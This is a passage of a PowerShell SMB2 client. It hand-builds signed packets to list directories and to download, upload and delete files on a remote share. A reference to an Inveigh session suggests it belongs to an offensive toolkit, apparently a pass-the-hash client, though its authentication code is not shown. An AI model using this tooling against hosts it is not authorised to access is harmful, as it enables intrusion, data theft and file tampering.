                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $message_ID++
                        $packet_SMB2b_header = New-PacketSMB2Header 0x0e,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                        if($SMB_signing)
                        {
                            $packet_SMB2b_header["Flags"] = 0x0c,0x00,0x00,0x00      
                        }
                        else
                        {
                            $packet_SMB2b_header["Flags"] = 0x04,0x00,0x00,0x00
                        }

                        $packet_SMB2b_data = New-PacketSMB2FindRequestFile $file_ID
                        $packet_SMB2b_data["OutputBufferLength"] = 0x80,0x00,0x00,0x00
                        $SMB2b_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_header
                        $SMB2b_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_data    
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService ($SMB2_header.Length + $SMB2b_header.Length)  ($SMB2_data.Length + $SMB2b_data.Length)
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2b_header + $SMB2b_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2b_header["Signature"] = $SMB2_signature
                            $SMB2b_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $SMB2b_header + $SMB2b_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if($Action -eq 'Get' -and $action_step -eq 1)
                        {
                            $find_response = [System.BitConverter]::ToString($client_receive)
                            $find_response = $find_response -replace "-",""
                            $file_unicode = [System.BitConverter]::ToString([System.Text.Encoding]::Unicode.GetBytes($source_file))
                            $file_unicode = $file_unicode -replace "-",""
                            $file_size_index = $find_response.IndexOf($file_unicode) - 128
                            $file_size = [System.BitConverter]::ToUInt32($client_receive[($file_size_index / 2)..($file_size_index / 2 + 7)],0)
                            $action_step++
                            $create_request_extra_info = 1
                            $stage = 'CreateRequest'

                            if($share_subdirectory -eq $file)
                            {
                                $file = [System.Text.Encoding]::Unicode.GetBytes($file)
                            }
                            else
                            {
                                $file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory)
                            }

                        }
                        else
                        {
                            $stage = 'ParseDirectoryContents'
                        }

                    }

                    'IoctlRequest'
                    {
                        $tree_ID = $client_receive[40..43]
                        $ioctl_path = "\" + $Target + "\" + $Share
                        $ioctl_path_bytes = [System.Text.Encoding]::Unicode.GetBytes($ioctl_path) + 0x00,0x00
                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2IoctlRequest $ioctl_path_bytes
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $tree_ID = 0x00,0x00,0x00,0x00
                        $stage = 'TreeConnect'
                    }

                    'Logoff'
                    {
                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x02,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2SessionLogoffRequest
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'Exit'
                    }

                    'ParseDirectoryContents'
                    {
                        $subdirectory_list = New-Object System.Collections.ArrayList
                        $create_response_file = [System.BitConverter]::ToString($client_receive)
                        $create_response_file = $create_response_file -replace "-",""
                        $directory_contents_mode_list = New-Object System.Collections.ArrayList
                        $directory_contents_create_time_list = New-Object System.Collections.ArrayList
                        $directory_contents_last_write_time_list = New-Object System.Collections.ArrayList
                        $directory_contents_length_list = New-Object System.Collections.ArrayList
                        $directory_contents_name_list = New-Object System.Collections.ArrayList

                        if($directory_list.Count -gt 0)
                        {
                            $create_response_file_index = 152
                            $directory_list.RemoveAt(0) > $null
                        }
                        else
                        {
                            $create_response_file_index = $create_response_file.Substring(10).IndexOf("FE534D42") + 154
                        }

                        do
                        {
                            $SMB_next_offset = [System.BitConverter]::ToUInt32($client_receive[($create_response_file_index / 2 + $SMB_offset)..($create_response_file_index / 2 + 3 + $SMB_offset)],0)
                            $SMB_file_length = [System.BitConverter]::ToUInt32($client_receive[($create_response_file_index / 2 + 40 + $SMB_offset)..($create_response_file_index / 2 + 47 + $SMB_offset)],0)
                            $SMB_file_attributes = [Convert]::ToString($client_receive[($create_response_file_index / 2 + 56 + $SMB_offset)],2).PadLeft(16,'0')

                            if($SMB_file_length -eq 0)
                            {
                                $SMB_file_length = $null
                            }

                            if($SMB_file_attributes.Substring(11,1) -eq '1')
                            {
                                $SMB_file_mode = "d"
                            }
                            else
                            {
                                $SMB_file_mode = "-"
                            }

                            if($SMB_file_attributes.Substring(10,1) -eq '1')
                            {
                                $SMB_file_mode+= "a"
                            }
                            else
                            {
                                $SMB_file_mode+= "-"
                            }

                            if($SMB_file_attributes.Substring(15,1) -eq '1')
                            {
                                $SMB_file_mode+= "r"
                            }
                            else
                            {
                                $SMB_file_mode+= "-"
                            }

                            if($SMB_file_attributes.Substring(14,1) -eq '1')
                            {
                                $SMB_file_mode+= "h"
                            }
                            else
                            {
                                $SMB_file_mode+= "-"
                            }

                            if($SMB_file_attributes.Substring(13,1) -eq '1')
                            {
                                $SMB_file_mode+= "s"
                            }
                            else
                            {
                                $SMB_file_mode+= "-"
                            }

                            $file_create_time = [Datetime]::FromFileTime([System.BitConverter]::ToInt64($client_receive[($create_response_file_index / 2 + 8 + $SMB_offset)..($create_response_file_index / 2 + 15 + $SMB_offset)],0))
                            $file_create_time = Get-Date $file_create_time -format 'M/d/yyyy h:mm tt'
                            $file_last_write_time = [Datetime]::FromFileTime([System.BitConverter]::ToInt64($client_receive[($create_response_file_index / 2 + 24 + $SMB_offset)..($create_response_file_index / 2 + 31 + $SMB_offset)],0))
                            $file_last_write_time = Get-Date $file_last_write_time -format 'M/d/yyyy h:mm tt'
                            $SMB_filename_length = [System.BitConverter]::ToUInt32($client_receive[($create_response_file_index / 2 + 60 + $SMB_offset)..($create_response_file_index / 2 + 63 + $SMB_offset)],0)
                            $SMB_filename_unicode = $client_receive[($create_response_file_index / 2 + 104 + $SMB_offset)..($create_response_file_index / 2 + 104 + $SMB_offset + $SMB_filename_length - 1)]
                            $SMB_filename = [System.BitConverter]::ToString($SMB_filename_unicode)
                            $SMB_filename = $SMB_filename -replace "-00",""

                            if($SMB_filename.Length -gt 2)
                            {
                                $SMB_filename = $SMB_filename.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                                $SMB_filename_extract = New-Object System.String ($SMB_filename,0,$SMB_filename.Length)
                            }
                            else
                            {
                                $SMB_filename_extract = [String][Char][System.Convert]::ToInt16($SMB_filename,16)
                            }

                            if(!$Modify)
                            {
                                $file_last_write_time = $file_last_write_time.PadLeft(19,0)
                                [String]$SMB_file_length = $SMB_file_length
                                $SMB_file_length = $SMB_file_length.PadLeft(15,0)
                            }

                            if($SMB_file_attributes.Substring(11,1) -eq '1')
                            {

                                if($SMB_filename_extract -ne '.' -and $SMB_filename_extract -ne '..')
                                {
                                    $subdirectory_list.Add($SMB_filename_unicode) > $null
                                    $directory_contents_name_list.Add($SMB_filename_extract) > $null
                                    $directory_contents_mode_list.Add($SMB_file_mode) > $null
                                    $directory_contents_length_list.Add($SMB_file_length) > $null
                                    $directory_contents_last_write_time_list.Add($file_last_write_time) > $null
                                    $directory_contents_create_time_list.Add($file_create_time) > $null
                                }

                            }
                            else
                            {
                                $directory_contents_name_list.Add($SMB_filename_extract) > $null
                                $directory_contents_mode_list.Add($SMB_file_mode) > $null
                                $directory_contents_length_list.Add($SMB_file_length) > $null
                                $directory_contents_last_write_time_list.Add($file_last_write_time) > $null
                                $directory_contents_create_time_list.Add($file_create_time) > $null
                            }

                            if($share_subdirectory -and !$share_subdirectory_start)
                            {
                                $root_directory_string = $share_subdirectory + '\'
                            }

                            $SMB_offset += $SMB_next_offset
                        }
                        until($SMB_next_offset -eq 0)

                        if($directory_contents_name_list)
                        {

                            if($root_directory_string)
                            {
                                $file_directory = $target_share + "\" + $root_directory_string.Substring(0,$root_directory_string.Length - 1)
                            }
                            else
                            {
                                $file_directory = $target_share
                            }

                        }

                        $directory_contents_output = @()
                        $i = 0

                        ForEach($directory in $directory_contents_name_list)
                        {
                            $directory_object = New-Object PSObject
                            Add-Member -InputObject $directory_object -MemberType NoteProperty -Name Name -Value ($file_directory + "\" + $directory_contents_name_list[$i])
                            Add-Member -InputObject $directory_object -MemberType NoteProperty -Name Mode -Value $directory_contents_mode_list[$i]
                            Add-Member -InputObject $directory_object -MemberType NoteProperty -Name Length -Value $directory_contents_length_list[$i]

                            if($Modify)
                            {
                                Add-Member -InputObject $directory_object -MemberType NoteProperty -Name CreateTime -Value $directory_contents_create_time_list[$i]
                            }

                            Add-Member -InputObject $directory_object -MemberType NoteProperty -Name LastWriteTime -Value $directory_contents_last_write_time_list[$i]
                            $directory_contents_output += $directory_object
                            $i++
                        }

                        if($directory_contents_output -and !$Modify)
                        {

                            if($directory_contents_hide_headers)
                            {
                                ($directory_contents_output | Format-Table -Property @{ Name="Mode"; Expression={$_.Mode }; Alignment="left"; },
                                                                            @{ Name="LastWriteTime"; Expression={$_.LastWriteTime }; Alignment="right"; },
                                                                            @{ Name="Length"; Expression={$_.Length }; Alignment="right"; },
                                                                            @{ Name="Name"; Expression={$_.Name }; Alignment="left"; } -AutoSize -HideTableHeaders -Wrap| Out-String).Trim()
                            }
                            else
                            {
                                $directory_contents_hide_headers = $true
                                ($directory_contents_output | Format-Table -Property @{ Name="Mode"; Expression={$_.Mode }; Alignment="left"; },
                                                                            @{ Name="LastWriteTime"; Expression={$_.LastWriteTime }; Alignment="right"; },
                                                                            @{ Name="Length"; Expression={$_.Length }; Alignment="right"; },
                                                                            @{ Name="Name"; Expression={$_.Name }; Alignment="left"; } -AutoSize -Wrap| Out-String).Trim()
                            }

                        }
                        else
                        {
                            $directory_contents_output
                        }

                        $subdirectory_list.Reverse() > $null

                        ForEach($subdirectory in $subdirectory_list)
                        {  
                            $directory_list.Insert(0,($root_directory + $subdirectory)) > $null
                        }
                        
                        $SMB_offset = 0
                        $stage = 'CloseRequest'
                    }

                    'QueryInfoRequest'
                    {
                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x10,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_header["NextCommand"] = $header_next_command
                        $packet_SMB2_data = New-PacketSMB2QueryInfoRequest $query_info_request_info_type_1 $query_info_request_file_info_class_1 $query_info_request_output_buffer_length_1 $query_info_request_input_buffer_offset_1 $file_ID $query_info_request_buffer_1
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $message_ID++
                        $packet_SMB2b_header = New-PacketSMB2Header 0x10,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                        if($SMB_signing)
                        {
                            $packet_SMB2b_header["Flags"] = 0x0c,0x00,0x00,0x00      
                        }
                        else
                        {
                            $packet_SMB2b_header["Flags"] = 0x04,0x00,0x00,0x00
                        }

                        $packet_SMB2b_data = New-PacketSMB2QueryInfoRequest $query_info_request_info_type_2 $query_info_request_file_info_class_2 $query_info_request_output_buffer_length_2 $query_info_request_input_buffer_offset_2 $file_ID $query_info_request_buffer_2
                        $SMB2b_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_header
                        $SMB2b_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService ($SMB2_header.Length + $SMB2b_header.Length)  ($SMB2_data.Length + $SMB2b_data.Length)
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2b_header + $SMB2b_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2b_header["Signature"] = $SMB2_signature
                            $SMB2b_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $SMB2b_header + $SMB2b_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if($share_subdirectory_start)
                        {
                            $file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory)
                            $root_directory = $file + 0x5c,0x00
                            $create_request_extra_info = 1
                            $stage = 'CreateRequest'
                        }
                        elseif($Action -eq 'Get')
                        {

                            switch($action_step)
                            {

                                5
                                {
                                    $query_info_response = [System.BitConverter]::ToString($client_receive)
                                    $query_info_response = $query_info_response -replace "-",""
                                    $file_stream_size_index = $query_info_response.Substring(10).IndexOf("FE534D42") + 170
                                    $file_stream_size = [System.BitConverter]::ToUInt32($client_receive[($file_stream_size_index / 2)..($file_stream_size_index / 2 + 8)],0)
                                    $file_stream_size_quotient = [Math]::Truncate($file_stream_size / 65536)
                                    $file_stream_size_remainder = $file_stream_size % 65536
                                    $percent_complete = $file_stream_size_quotient

                                    if($file_stream_size_remainder -ne 0)
                                    {
                                        $percent_complete++
                                    }
                                    
                                    if($file_stream_size -lt 1024)
                                    {
                                        $progress_file_size = "" + $file_stream_size + "B"
                                    }
                                    elseif($file_stream_size -lt 1024000)
                                    {
                                        $progress_file_size = "" + ($file_stream_size / 1024).ToString('.00') + "KB"
                                    }
                                    else
                                    {
                                        $progress_file_size = "" + ($file_stream_size / 1024000).ToString('.00') + "MB"
                                    }

                                    $header_next_command = 0x70,0x00,0x00,0x00
                                    $query_info_request_info_type_1 = 0x02
                                    $query_info_request_file_info_class_1 = 0x01
                                    $query_info_request_output_buffer_length_1 = 0x58,0x00,0x00,0x00
                                    $query_info_request_input_buffer_offset_1 = 0x00,0x00
                                    $query_info_request_buffer_1 = 8
                                    $query_info_request_info_type_2 = 0x02
                                    $query_info_request_file_info_class_2 = 0x05
                                    $query_info_request_output_buffer_length_2 = 0x50,0x00,0x00,0x00
                                    $query_info_request_input_buffer_offset_2 = 0x00,0x00
                                    $query_info_request_buffer_2 = 1
                                    $action_step++
                                    $stage = 'QueryInfoRequest'
                                }

                                6
                                {

                                    if($file_stream_size -lt 65536)
                                    {
                                        $read_request_length = $file_stream_size
                                    }
                                    else
                                    {
                                        $read_request_length = 65536
                                    }

                                    $read_request_offset = 0
                                    $read_request_step = 1
                                    $action_step++
                                    $stage = 'ReadRequest'
                                }

                            }
                        }
                        elseif($Action -eq 'Put')
                        {
                            $percent_complete = $source_file_size_quotient

                            if($source_file_size_remainder -ne 0)
                            {
                                $percent_complete++
                            }

                            if($source_file_size -lt 1024)
                            {
                                $progress_file_size = "" + $source_file_size + "B"
                            }
                            elseif($source_file_size -lt 1024000)
                            {
                                $progress_file_size = "" + ($source_file_size / 1024).ToString('.00') + "KB"
                            }
                            else
                            {
                                $progress_file_size = "" + ($source_file_size / 1024000).ToString('.00') + "MB"
                            }

                            $action_step++
                            $set_info_request_file_info_class = 0x01
                            $set_info_request_info_level = 0x14
                            $set_info_request_buffer = [System.BitConverter]::GetBytes($source_file_size)
                            $stage = 'SetInfoRequest'
                        }
                        elseif($Action -eq 'Delete')
                        {
                            $stage = 'CreateRequest'
                        }
                        else
                        {
                            $stage = 'CreateRequestFindRequest'
                        }

                    }

                    'ReadRequest'
                    {
                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x08,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2ReadRequest $read_request_length $read_request_offset $file_ID
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data 
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        Start-Sleep -m 5

                        if($read_request_length -eq 65536)
                        {
                            $i = 0

                            while($client.Available -lt 8192 -and $i -lt 10)
                            {
                                Start-Sleep -m $Sleep
                                $i++
                            }

                        }
                        else
                        {
                            Start-Sleep -m $Sleep
                        }
                        
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if($Action -eq 'Get' -and $action_step -eq 3)
                        {
                            $action_step++
                            $create_request_extra_info = 1
                            $stage = 'CreateRequest'
                        }
                        elseif($Action -eq 'Get' -and $action_step -eq 7)
                        {

                            if(!$NoProgress)
                            {
                                $percent_complete_calculation = [Math]::Truncate($read_request_step / $percent_complete * 100)
                                Write-Progress -Activity "Downloading $source_file - $progress_file_size" -Status "$percent_complete_calculation% Complete:" -PercentComplete $percent_complete_calculation
                            }

                            $file_bytes = $client_receive[84..($read_request_length + 83)]
    
                            if(!$Modify)
                            {

                                if(!$file_write)
                                {
                                    $file_write = New-Object 'System.IO.FileStream' $destination_path,'Append','Write','Read'
                                }

                                $file_write.Write($file_bytes,0,$file_bytes.Count)
                            }
                            else
                            {
                                $file_memory.AddRange($file_bytes)
                            }

                            if($read_request_step -lt $file_stream_size_quotient)
                            {
                                $read_request_offset+=65536
                                $read_request_step++
                                $stage = 'ReadRequest'
                            }
                            elseif($read_request_step -eq $file_stream_size_quotient -and $file_stream_size_remainder -ne 0)
                            {
                                $read_request_length = $file_stream_size_remainder
                                $read_request_offset+=65536
                                $read_request_step++
                                $stage = 'ReadRequest'
                            }
                            else
                            {

                                if(!$Modify)
                                {
                                    $file_write.Close()
                                }
                                else
                                {
                                    [Byte[]]$file_memory = $file_memory
                                    ,$file_memory
                                }

                                $output_message = "[+] File downloaded"
                                $stage = 'CloseRequest'
                            }
                            
                        }
                        elseif([System.BitConverter]::ToString($client_receive[12..15]) -ne '03-01-00-00')
                        {
                            $stage = 'CloseRequest'
                        }
                        else
                        {
                            $stage = 'CloseRequest'
                        }

                    }

                    'SetInfoRequest'
                    {
                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x11,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2SetInfoRequest $set_info_request_file_info_class $set_info_request_info_level $file_ID $set_info_request_buffer
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if($source_file_size -le 65536)
                        {
                            $write_request_length = $source_file_size
                        }
                        else
                        {
                            $write_request_length = 65536
                        }

                        $write_request_offset = 0
                        $write_request_step = 1

                        if($Action -eq 'Delete')
                        {
                            $output_message = "[+] File deleted"
                            $stage = 'CloseRequest'
                            $action_step++
                        }
                        elseif($Action -eq 'Put' -and $action_step -eq 4)
                        {
                            $output_message = "[+] File uploaded"
                            $stage = 'CloseRequest'
                        }
                        else
                        {
                            $stage = 'WriteRequest'
                        }

                    }

                    'TreeConnect'
                    {
                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x03,0x00 0x1f,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2TreeConnectRequest $path_bytes
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                        try
                        {
                            $client_stream.Write($client_send,0,$client_send.Length) > $null
                            $client_stream.Flush()
                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        }
                        catch
                        {
                            Write-Output "[-] Session connection is closed"
                            $stage = 'Exit'
                        }
                        
                        if($stage -ne 'Exit')
                        {

                            if([System.BitConverter]::ToString($client_receive[12..15]) -ne '00-00-00-00')
                            {
                                $error_code = [System.BitConverter]::ToString($client_receive[12..15])

                                switch($error_code)
                                {

                                    'cc-00-00-c0'
                                    {
                                        $output_message = "[-] Share not found"
                                        $stage = 'Exit'
                                    }

                                    '22-00-00-c0'
                                    {
                                        $output_message = "[-] Access denied"
                                        $stage = 'Exit'
                                    }

                                    default
                                    {
                                        $error_code = $error_code -replace "-",""
                                        $output_message = "[-] Tree connect error code 0x$error_code"
                                        $stage = 'Exit'
                                    }

                                }

                            }
                            elseif($refresh)
                            {
                                Write-Output "[+] Session refreshed"
                                $stage = 'Exit'
                            }
                            elseif(!$SMB_IPC)
                            {
                                $SMB_share_path = "\\" + $Target + "\" + $Share
                                $path_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_share_path)
                                $SMB_IPC = $true
                                $stage = 'IoctlRequest'
                                $file = ""
                            }
                            else
                            {

                                if($Action -eq 'Put')
                                {
                                    $file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory)
                                    $create_request_extra_info = 2
                                }
                                else
                                {
                                    $create_request_extra_info = 1
                                }

                                $tree_ID = $client_receive[40..43]
                                $stage = 'CreateRequest'

                                if($Action -eq 'Get')
                                {
                                    $file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory)
                                }

                            }

                        }

                    }

                    'TreeDisconnect'
                    {
                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x04,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2TreeDisconnectRequest
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if($inveigh_session -and !$Logoff)
                        {
                            $stage = 'Exit'
                        }
                        else
                        {
                            $stage = 'Logoff'
                        }

                    }
                        
                    'WriteRequest'
                    {

                        if(!$Modify)
                        {
                            $source_file_binary_reader.BaseStream.Seek($write_request_offset,"Begin") > $null
                            $source_file_binary_reader.Read($source_file_buffer,0,$source_file_buffer_size) > $null
                        }
                        else
                        {
                            $source_file_buffer = $Source[$write_request_offset..($write_request_offset+$write_request_length)]
                        }
                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_header["CreditCharge"] = 0x01,0x00
                        $packet_SMB2_data = New-PacketSMB2WriteRequest $write_request_length $write_request_offset $file_ID $source_file_buffer
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data 
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if($write_request_step -lt $source_file_size_quotient)
                        {

                            if(!$NoProgress)
                            {
                                $percent_complete_calculation = [Math]::Truncate($write_request_step / $percent_complete * 100)
                                Write-Progress -Activity "[*] Uploading $source_file - $progress_file_size" -Status "$percent_complete_calculation% Complete:" -PercentComplete $percent_complete_calculation
                            }

                            $write_request_offset+=65536
                            $write_request_step++
                            $stage = 'WriteRequest'
                        }
                        elseif($write_request_step -eq $source_file_size_quotient -and $source_file_size_remainder -ne 0)
                        {
                            $write_request_length = $source_file_size_remainder
                            $write_request_offset+=65536
                            $write_request_step++
                            $stage = 'WriteRequest'
                        }
                        else
                        {
                            $action_step++
                            $set_info_request_file_info_class = 0x01
                            $set_info_request_info_level = 0x04
                            $set_info_request_buffer = $source_file_creation_time +
                                                        $source_file_last_access_time +
                                                        $source_file_last_write_time +
                                                        $source_file_last_change_time + 
                                                        0x00,0x00,0x00,0x00,
                                                        0x00,0x00,0x00,0x00

                            if(!$Modify)
                            {
                                $stage = 'SetInfoRequest'
                            }
                            else
                            {
                                $output_message = "[+] File uploaded from memory"
                                $stage = 'CloseRequest'
                            }

                        }

                    }
                    
                }
            
            }

        }

    }
    catch
